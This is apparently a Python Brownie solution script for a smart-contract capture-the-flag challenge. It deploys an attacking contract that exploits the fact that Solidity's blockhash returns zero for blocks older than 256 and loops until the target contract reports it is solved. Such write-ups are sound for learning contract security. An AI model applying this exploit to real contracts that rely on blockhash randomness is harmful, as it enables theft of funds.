#!/usr/bin/python3
from brownie import Attack
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from colorama import Fore
from time import time

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def print_colour(solved):
    if solved:
        print(f"{blue}Is complete: {green}{True}{reset}")
    else:
        print(f"{blue}Is complete: {red}{solved}{reset}")


def hack(contract_address=None, attacker=None):
    if not contract_address:
        target, _ = deploy()
        _, attacker = get_account()
    else:
        print(f"{red}Something is wrong{reset}")
        exit(-1)

    print_colour(target.isComplete())

    attcking_contract = Attack.deploy(target.address, {"from": attacker})

    # attcking_contract.lookInGuess({"from": attacker, "value": "1 ether"}).wait(1)

    """
    https://docs.soliditylang.org/en/v0.6.8/units-and-global-variables.html#block-and-transaction-properties
    
    The block hashes are not available for all blocks for scalability reasons. You can only access the hashes of the most recent 256 blocks, all other values will be zero.

    This means that after 256 + 1 blocks of locking our guess our "random" answer will be 0. So we we can exploit it:

    1. Call lockInGuess with 
    2. 0x0000000000000000000000000000000000000000000000000000000000000000
    Wait for 257 blocks
    """
    attcking_contract.lookInGuess({"from": attacker, "value": "1 ether"}).wait(1)

    while target.isComplete() != True:
        try:
            attcking_contract.hack({"from": attacker, "value": "1 ether"}).wait(1)
        except:
            pass

    print_colour(target.isComplete())

    assert target.isComplete() == True


def main(contract_address=None):
    if contract_address:
        hack(contract_address, get_account())
    else:
        hack()


if __name__ == "__main__":
    main()
